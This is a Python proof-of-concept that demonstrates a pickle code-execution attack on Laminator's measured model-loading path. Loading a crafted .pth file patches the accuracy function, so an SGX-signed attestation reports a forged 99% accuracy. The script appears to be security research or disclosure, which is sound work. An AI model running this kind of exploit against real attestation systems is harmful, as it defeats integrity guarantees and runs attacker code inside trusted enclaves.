#!/usr/bin/env python3
"""
Demonstrate the pickle attack against Laminator's measured-load path.

This script does not modify Laminator. It imports Laminator's utils
module (the same one accuracy_attestation calls into) and then exercises
the load path that main.py uses:

    measured_bytes_model, _ = measured_file_read.open_measured(path, "rb")
    model.load_state_dict(torch.load(measured_bytes_model))

The expected outcome is:

  Before torch.load: utils.test is the legitimate function.
  After torch.load:  utils.test is the attacker's constant-0.99 lambda.
  The returned state_dict still loads cleanly into LinearNet([128]).
"""

import argparse
import hashlib
import os
import sys

import torch

DEFAULT_LAMINATOR_SRC = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "laminator", "generate_attestations")
DEFAULT_EVIL_PATH = "census_model.pth"


def _import_laminator_modules(laminator_src: str):
    """Import utils, models, measured_file_read from Laminator's source tree."""
    if not os.path.isdir(laminator_src):
        print(f"error: --laminator-src not found: {laminator_src}", file=sys.stderr)
        sys.exit(1)
    if laminator_src not in sys.path:
        sys.path.insert(0, laminator_src)
    import measured_file_read  # noqa: WPS433
    import models  # noqa: WPS433
    import utils  # noqa: WPS433
    return measured_file_read, models, utils


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--laminator-src",
        default=DEFAULT_LAMINATOR_SRC,
        help="Path to Laminator's generate_attestations/ directory.",
    )
    parser.add_argument(
        "--evil-model",
        default=DEFAULT_EVIL_PATH,
        help="Path to the evil .pth produced by build_evil_model.py.",
    )
    args = parser.parse_args()

    if not os.path.exists(args.evil_model):
        print(
            f"error: {args.evil_model} not found. Run build_evil_model.py first.",
            file=sys.stderr,
        )
        return 1

    measured_file_read, models, utils = _import_laminator_modules(args.laminator_src)

    print("[1] Reading evil model exactly as Laminator's main.py does:")
    print(f"        measured_file_read.open_measured({args.evil_model!r}, 'rb')")
    measured, _load_time = measured_file_read.open_measured(args.evil_model, "rb")
    sha512 = measured.hasher.digest()
    sha512_hex = sha512.hex()
    print(f"    SHA-512 of file bytes (Laminator's `name`): {sha512_hex}")
    print()

    print("[2] BEFORE torch.load — utils.test identity:")
    print(f"        utils.test = {utils.test!r}")
    legitimate_test = utils.test
    print()

    print("[3] Calling torch.load(measured) — this is the privileged-RCE step:")
    state_dict = torch.load(measured)
    print(f"    torch.load returned an object of type: {type(state_dict).__name__}")
    print(f"    keys: {list(state_dict.keys())}")
    print()

    print("[4] AFTER torch.load — utils.test identity:")
    print(f"        utils.test = {utils.test!r}")
    patched = utils.test is not legitimate_test
    print(f"    Patched? {patched}")
    print()

    print("[5] Invoking utils.test the same way accuracy_attestation does")
    print("    (main.py:299:  accuracy = utils.test(args, model, test_loader)):")
    forged_accuracy = utils.test(None, None, None)
    print(f"    utils.test(None, None, None) -> {forged_accuracy!r}")
    print()

    print("[6] Confirm the state_dict loads cleanly into LinearNet([128]):")
    model = models.LinearNet([128])
    model.load_state_dict(state_dict)
    print("    model.load_state_dict(state_dict)  -> OK (keys + shapes match)")
    print()

    print("[7] What the attestation payload at main.py:312-323 would carry,")
    print("    using exactly the values the patched run produces:")
    print(
        f'        {{\n'
        f'            "name": "{sha512_hex[:64]}...",\n'
        f'            "results": {{\n'
        f'                "task": "classification",\n'
        f'                "dataset": "CENSUS",\n'
        f'                "metrics": {{\n'
        f'                    "type": "accuracy",\n'
        f'                    "value": {forged_accuracy},\n'
        f'                    "dataset-hash": "<sha512 of host-supplied data file>"\n'
        f'                }}\n'
        f'            }}\n'
        f'        }}\n'
    )
    print(
        "    Under --with_sgx 1, quote_generator.generate_quote(sha512(payload))\n"
        "    embeds that payload's digest in the SGX REPORTDATA field.\n"
        "    The Intel-signed quote then commits to a payload that says\n"
        f"    'value: {forged_accuracy}' regardless of what the model actually does."
    )
    print()

    # Sanity: a fresh LinearNet([128]) on real CENSUS test data would score
    # ~24% (majority class) — i.e., NOWHERE near 99%. The attestation lies.
    print("[8] As a sanity check, the LinearNet weights returned by the pickle")
    print("    are freshly-initialised — random — so the *real* accuracy of")
    print("    this model on CENSUS would be near chance (~24% / majority).")
    print("    The 99% number is the attacker's choice, not a computation.")

    if not patched:
        print("\n!! WARNING: utils.test was NOT patched. Attack failed. !!")
        return 2
    if forged_accuracy != 0.99:
        print(
            f"\n!! WARNING: utils.test returned {forged_accuracy!r}, expected 0.99. !!"
        )
        return 2
    print()
    print("[+] ATTACK CONFIRMED (P1, F5 — model file runs code inside the enclave at load)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
